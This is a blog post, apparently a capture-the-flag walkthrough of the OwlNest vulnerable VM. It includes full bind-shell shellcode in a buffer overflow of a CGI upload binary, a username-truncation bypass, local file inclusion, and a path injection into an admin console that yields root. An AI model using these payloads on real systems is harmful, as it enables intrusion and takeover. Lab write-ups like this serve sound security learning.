
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Owl Up In My Grill - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="So, while we were all sitting in #vulnhub (on Freenode) waiting forsuperkojiman to release Persistence, Swappage released OwlNest. I thought, what &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/blog/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/blog/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">Owl Up in My Grill</h2>
	<div class="entry-content"><p>So, while we were all sitting in #vulnhub (on Freenode) waiting for<a href="https://twitter.com/superkojiman">superkojiman</a> to release Persistence, <a href="https://twitter.com/swappage">Swappage</a> released <a href="vulnhub.com/entry/owlnest-102,102/">OwlNest</a>. I thought, what the hell, might as well use it to pass the time, right ? I was, however, not expecting it to take me 4 days&hellip;</p>

<!-- more -->


<h2>Were You Born in a Barn (Owl) ?</h2>

<p>A quick dig around using NMAP</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:/var/www# nmap -sS -O -p1-65535 &ndash;script banner 172.16.56.131 -P0</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-01 22:49 BST
Nmap scan report for 172.16.56.131
Host is up (0.00034s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp    open  http
111/tcp   open  rpcbind
31337/tcp open  Elite
| banner: (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)\x0D\x
|</em>0A        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\&hellip;
34895/tcp open  unknown
MAC Address: 00:0C:29:9A:51:B8 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10
Network Distance: 1 hop</p>

<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
root@pwk:/var/www#
[/plain]</p>

<p>Looks like there&rsquo;s a banner on port 31337, might as well get all of it, and see if the service behind it is vulnerable to format string.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:/var/www# nc -nv 172.16.56.131 31337
nc: 172.16.56.131 31337 open
        (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
   &mdash;&ndash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/</p>

<p>This is the OwlNest Administration console</p>

<p>Type Help for a list of available commands.</p>

<p>Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
Ready: help</p>

<p>Syntax: command <argument></p>

<p>help         This help
username     Specify your login name
password     Specify your password
privs    Specify your access level
login        login to shell with specified username and password</p>

<p>Ready:
[/plain]</p>

<p>This looks like something we&rsquo;ll need a username and password for. As none are known, this port is being ignored for now. Port 80&rsquo;s where it&rsquo;s at then.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png" alt="owlnest_001" /></a></p>

<p>The Register link allows us to create a new user, which we can use to log in and look around</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png" alt="owlnest_002" /></a></p>

<p>But it seems we&rsquo;re not allowed to use the Upload feature, because we&rsquo;re not &ldquo;admin&rdquo;. An interesting point to note here is that the URL for the Upload feature is <a href="http://172.16.56.131/uploadform.php?page=forms/form.php,">http://172.16.56.131/uploadform.php?page=forms/form.php,</a> which means we could possibly leverage it for LFI. No other links on the site work in this way.</p>

<p>Looking at the source for the registration page, it seems the username is capped at 16 characters.</p>

<p>[html]</p>

<div class="form-group">
                <label for="nome" class="col-sm-2 col-lg-2 control-label">Login Name:</label>
                <div class="col-sm-5 col-lg-5">
                    <input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
                </div>
            </div>


<p>[/html]</p>

<p>Could we cheat the system and register a user with the name &ldquo;admin&rdquo; and then add 11 spaces after it plus a random character ? We can assume that the registration form will truncate any characters over 16. Tamper data is our friend here - the form can be filled in with the username of &ldquo;admin&rdquo; and then intercepted with Tamper data (or Burp, if you want) to modify the username POST variable to &ldquo;admin           a&rdquo; and submitted.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png" alt="owlnest_003" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png" alt="owlnest_004" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png" alt="owlnest_005" /></a></p>

<p>Once this malicious user is created, it is possible to then log in with the username of &ldquo;admin&rdquo; and the password we set for &ldquo;admin           a&rdquo;.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png" alt="owlnest_006" /></a></p>

<p>Which allows access to the Upload feature (not that we&rsquo;re going to use it for it&rsquo;s intended use)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png" alt="owlnest_007" /></a></p>

<hr />

<h2>This is a Hoot !</h2>

<p>The upload form posts to /application/upload</p>

<p>[html]
<form class="form-horizontal" method="POST" enctype="multipart/form-data" action="/application/upload">
[/html]</p>

<p>Which when called with no arguments shows the following</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png" alt="owlnest_008" /></a></p>

<p>It is possible to browse to the application folder, which shows that the application is actually 601kb - a bit much just to parse an upload form.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png" alt="owlnest_009" /></a></p>

<h2>Owls Well That Ends Well</h2>

<p>The uploadform.php page can be used to provide us with a base64 encoded copy of the upload binary, which means it will not be parsed or executed.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png" alt="owlnest_010" /></a></p>

<p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#109;&#x65;&#x40;&#109;&#101;&#46;&#99;&#111;&#x6d;">&#109;&#101;&#64;&#109;&#101;&#46;&#x63;&#x6f;&#x6d;</a>&rdquo;
root@pwk:~# ./owlbin
Content-type: text/plain</p>

<p>Unable to open file
root@pwk:~#
[/plain]</p>

<p>It is possible to overflow this application via the email variable, which through some further investigation identifies that EIP is at offset 277.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# export QUERY_STRING=$(python -c &lsquo;print &ldquo;uploadfield=/etc/passwd&amp;uploadfield=bleh99&amp;name=Me&amp;email=AAH@&rdquo; + &ldquo;A&rdquo;*276+&ldquo;BBBB&rdquo;&rsquo;)
root@pwk:~# ./owlbin
Content-type: text/plain</p>

<p>Segmentation fault
root@pwk:~#
[/plain]</p>

<p>gdb-peda can be used to find a jmp esp call, which is at 0x80c75ab9. This is what we&rsquo;ll set our EIP value to, which should hopefully jump to our bind shell shellcode. This can be completely exploited as follows</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# export QUERY_STRING=$(python -c &lsquo;print &ldquo;uploadfield=/etc/passwd&amp;uploadfield=passwd&amp;name=Russ&amp;email=AAH@&rdquo; + &ldquo;A&rdquo;*276+&ldquo;\xab\x75\x0c\x08&rdquo; + &ldquo;\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80&rdquo;&rsquo;)
root@pwk:~# curl -v &ldquo;<a href="http://172.16.56.140/application/upload">http://172.16.56.140/application/upload</a>&rdquo; &ndash;data &ldquo;$QUERY_STRING&rdquo;
* About to connect() to 172.16.56.140 port 80 (#0)
*   Trying 172.16.56.140&hellip;
* connected
* Connected to 172.16.56.140 (172.16.56.140) port 80 (#0)</p>

<blockquote><p>POST /application/upload HTTP/1.1
User-Agent: curl/7.26.0
Host: 172.16.56.140
Accept: <em>/</em>
Content-Length: 436
Content-Type: application/x-www-form-urlencoded</p>

<ul>
<li>upload completely sent off: 436 out of 436 bytes
root@pwk:~# nc -nv 172.16.56.140 1337
nc: 172.16.56.140 1337 open
id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
[/plain]</li>
</ul>
</blockquote>

<p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x72;&#109;&#112;&#x40;&#x31;&#x37;&#x32;&#x2e;&#49;&#x36;&#x2e;&#53;&#54;&#x2e;&#49;&#51;&#x31;">&#114;&#109;&#112;&#64;&#x31;&#x37;&#50;&#46;&#x31;&#54;&#x2e;&#53;&#x36;&#x2e;&#x31;&#x33;&#x31;</a>
The authenticity of host &lsquo;172.16.56.131 (172.16.56.131)&rsquo; can&rsquo;t be established.
RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;172.16.56.131&rsquo; (RSA) to the list of known hosts.
Linux owlnest 3.2.0-4-686-pae #1 SMP Debian 3.2.60-1+deb7u3 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
rmp@owlnest:~$ id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
rmp@owlnest:~$
[/plain]</p>

<p>There&rsquo;s one application available in /home/rmp, and that&rsquo;s the application that is listening on port 31337 (the one that requested username and password etc).</p>

<p>[plain gutter=&ldquo;false&rdquo;]
rmp@owlnest:~$ ls -l
total 588
-rwx&mdash;&mdash; 1 rmp rmp 599275 Aug 11 13:35 adminconsole
rmp@owlnest:~$
[/plain]</p>

<p>which when straced, shows that it is reading /root/password.txt to check the provided credentials.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# strace ./adminconsole
execve(&ldquo;./adminconsole&rdquo;, [&ldquo;./adminconsole&rdquo;], [/<em> 19 vars </em>/]) = 0
uname({sys=&ldquo;Linux&rdquo;, node=&ldquo;pwk&rdquo;, &hellip;})   = 0
brk(0)                                  = 0x9407000
brk(0x9407cd0)                          = 0x9407cd0
set_thread_area({entry_number:-1 -> 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x9428cd0)                          = 0x9428cd0
brk(0x9429000)                          = 0x9429000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775e000
write(1, &ldquo;        (\<strong><em>/)   (\</em></strong>/)   (\<strong>&rdquo;&hellip;, 67        (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)
) = 67
write(1, &ldquo;        /0\ /0\   /o\ /o\   /0\ &rdquo;&hellip;, 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, &ldquo;        \</strong>V<strong>/   \</strong>V<strong>/   \</strong>V&rdquo;&hellip;, 67        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
) = 67
write(1, &ldquo;       /|:. .:|\ /|;, ,;|\ /|:. &rdquo;&hellip;, 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, &ldquo;       &#92;:::::// &#92;;;;;;// &#92;:::&rdquo;&hellip;, 68       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
) = 68
write(1, &ldquo;   &mdash;&ndash;<code>\"\" \"\"</code>&mdash;<code>\"\" \"\"</code>&mdash;<code>\"\" "..., 70   -----</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;`&mdash;
) = 70
write(1, &rdquo;        \<strong>V</strong>/   \<strong>V</strong>/   \<strong>V&#8221;&hellip;, 69        __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V__/</p>

<p>) = 69
write(1, &ldquo;This is the OwlNest Administrati&rdquo;&hellip;, 46This is the OwlNest Administration console</p>

<p>) = 46
write(1, &ldquo;Type Help for a list of availabl&rdquo;&hellip;, 47Type Help for a list of available commands.</p>

<p>) = 47
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775d000
read(0, username root
&ldquo;username root\n&rdquo;, 1024)        = 14
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&ldquo;privs AAAAAAAAAAAAAAAAAAAAAAAAAA&rdquo;&hellip;, 1024) = 96
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, password hello
&ldquo;password hello\n&rdquo;, 1024)       = 15
open(&ldquo;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775c000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
<em>llseek(3, 0, [0], SEEK_SET)            = 0
read(3, &ldquo;cunt\n&rdquo;, 5)                    = 5
</em>llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb775c000, 4096)                = 0
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, ^C <unfinished ...>
root@pwk:~# [/plain]</p>

<p>However, by pure chance, in this particular attempt, I tried to overflow the privs command, and as you can see, it seems the application is attempting to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA before the password file. Can we use this to make the application open a file containing a password we control ? Yes, yes we can&hellip;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# strace ./adminconsole
execve(&ldquo;./adminconsole&rdquo;, [&ldquo;./adminconsole&rdquo;], [/<em> 19 vars </em>/]) = 0
uname({sys=&ldquo;Linux&rdquo;, node=&ldquo;pwk&rdquo;, &hellip;})   = 0
brk(0)                                  = 0x84b0000
brk(0x84b0cd0)                          = 0x84b0cd0
set_thread_area({entry_number:-1 -> 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x84d1cd0)                          = 0x84d1cd0
brk(0x84d2000)                          = 0x84d2000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7717000
write(1, &ldquo;        (\<strong><em>/)   (\</em></strong>/)   (\<strong>&rdquo;&hellip;, 67        (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)
) = 67
write(1, &ldquo;        /0\ /0\   /o\ /o\   /0\ &rdquo;&hellip;, 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, &ldquo;        \</strong>V<strong>/   \</strong>V<strong>/   \</strong>V&rdquo;&hellip;, 67        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
) = 67
write(1, &ldquo;       /|:. .:|\ /|;, ,;|\ /|:. &rdquo;&hellip;, 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, &ldquo;       &#92;:::::// &#92;;;;;;// &#92;:::&rdquo;&hellip;, 68       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
) = 68
write(1, &ldquo;   &mdash;&ndash;<code>\"\" \"\"</code>&mdash;<code>\"\" \"\"</code>&mdash;<code>\"\" "..., 70   -----</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;`&mdash;
) = 70
write(1, &rdquo;        \<strong>V</strong>/   \<strong>V</strong>/   \<strong>V&#8221;&hellip;, 69        __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V__/</p>

<p>) = 69
write(1, &ldquo;This is the OwlNest Administrati&rdquo;&hellip;, 46This is the OwlNest Administration console</p>

<p>) = 46
write(1, &ldquo;Type Help for a list of availabl&rdquo;&hellip;, 47Type Help for a list of available commands.</p>

<p>) = 47
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7716000
read(0, username root
&ldquo;username root\n&rdquo;, 1024)        = 14
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, privs /home/meh/password.txt
&ldquo;privs /home/meh/password.txt\n&rdquo;, 1024) = 29
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, password arse
&ldquo;password arse\n&rdquo;, 1024)        = 14
open(&ldquo;rd.txt&rdquo;, O_RDONLY)                = -1 ENOENT (No such file or directory)
open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
<em>llseek(3, 0, [0], SEEK_SET)            = 0
read(3, &ldquo;blah\n&rdquo;, 5)                    = 5
</em>llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
[/plain]</p>

<p>As you can see here, it&rsquo;s cut off the first 16 characters of our priv input, and is trying to open &ldquo;rd.txt&rdquo;, which doesn&rsquo;t exist. Therefore we have to pad the privs input by 16 characters.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, username root
&ldquo;username root\n&rdquo;, 1024)        = 14
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
&ldquo;privs AAAAAAAAAAAAAAAA/home/meh/&rdquo;&hellip;, 1024) = 45
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, password bleh
&ldquo;password bleh\n&rdquo;, 1024)        = 14
open(&ldquo;/home/meh/password.txt&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
<em>llseek(3, 0, [0], SEEK_SET)            = 0
read(3, &ldquo;cunt\n&rdquo;, 5)                    = 5
</em>llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0,
[/plain]</p>

<p>So, all we need to do now, is write a file to /home/rmp containing a password, and make the application read it instead of /root/password.txt.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nc 172.16.56.140 31337
        (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
   &mdash;&ndash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/</p>

<p>This is the OwlNest Administration console</p>

<p>Type Help for a list of available commands.</p>

<p>Ready: username root
Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
Ready: password password
Ready: login
Access Granted!
Dropping into /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
               \ <code>-._......_.-</code> /
                <code>.  '.    .'  .'    Oh Well, in the end you did it!
                 //  _</code>\/<code>_  \\     You stopped the olws' evil plan
                ||  /\O||O/\  ||    By pwning their secret base you
                |\  \_/||\_/  /|    saved the world!
                \ '.   \/   .' /
                / ^</code>&lsquo;~  ~&rsquo;`   \
               /  <em>-^</em>~ -^<em> ~-  |
               | / ^</em> -^<em>- ~</em>^\ |
               | |~<em> ^- </em>-^<em> -| |
               | \  ^-~</em> ~-<em>^ / |
               _/;-.,</em><em><em><em>,.-;_/
        ==========(</em>(</em>(==)</em>)_)=========</p>

<p>The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4</p>

<p>Hope you enjoyed this vulnerable VM.
Looking forward to see a writeup from you soon!
don&rsquo;t forget to ping me on twitter with your thoughts</p>

<p>Sincerely
@Swappage</p>

<p>PS: why the owls? oh well, I really don&rsquo;t know and yes: i really suck at fictioning :p
True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
[/plain]</p>

<p><img src="http://media.tumblr.com/69d8d838b215ce8aeb5bcee2cac8c67a/tumblr_inline_n6f627Eb3o1rv1fhg.gif" alt="" /></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-10-26T17:16:50+00:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>